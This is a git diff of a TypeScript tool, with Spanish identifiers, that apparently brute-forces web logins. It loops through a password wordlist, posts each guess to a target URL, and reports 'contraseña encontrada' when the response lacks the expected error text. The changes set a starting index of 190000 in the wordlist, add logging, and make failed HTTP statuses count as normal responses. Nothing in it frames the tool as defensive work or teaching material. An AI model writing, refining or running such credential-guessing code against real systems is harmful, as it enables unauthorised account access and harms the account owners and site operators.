@@ -61,7 +61,7 @@ let found=false
 let contador=0
 let workers=0
 
-let elemento:number=-1
+let elemento:number=190000
 
 
 //functions declaracions
@@ -72,6 +72,8 @@ async function worker(){ console.log("worker iniciado")
     let body= JSON.parse(yarg.body)
     let usernamebody= Object.keys(body)[0]
     let passwordbody= Object.keys(body)[1]
+
+    console.log("passwordbody:",passwordbody)
     let freezeelemento1= elemento
     let freezeelemento=0
 
@@ -86,21 +88,29 @@ async function worker(){ console.log("worker iniciado")
             if (freezeelemento >= wordlist.length) {
       break;
     }
-
+        let passw=""
               if(yarg.password===true){
-                let passw:any= wordlist[freezeelemento]
+                 passw= wordlist[freezeelemento]
         try{
-            
+            freezeelemento1=freezeelemento
+
             body[passwordbody]=passw; 
 
+           
+            
+
             let currentbody={...body}
-         let peticion:any= await  axios.post(trueurl,currentbody,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]})
+
+            
+
+        
+         let peticion:any= await  axios.post(trueurl,currentbody,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data], validateStatus: () => true })
          let data:String=peticion.data
 
                 if(data.includes(error)){++contador}
                 if(contador%100===0){console.log(contador)}
-                else if(!data.includes(error)){console.log("contraseña encontrada:",passw,"html:",data),found=true}
-            freezeelemento1=freezeelemento
+                if(!data.includes(error)){console.log("contraseña encontrada:",passw,"html:",data),found=true}
+            
 
         }catch(error){booleanfreeze=true}
         
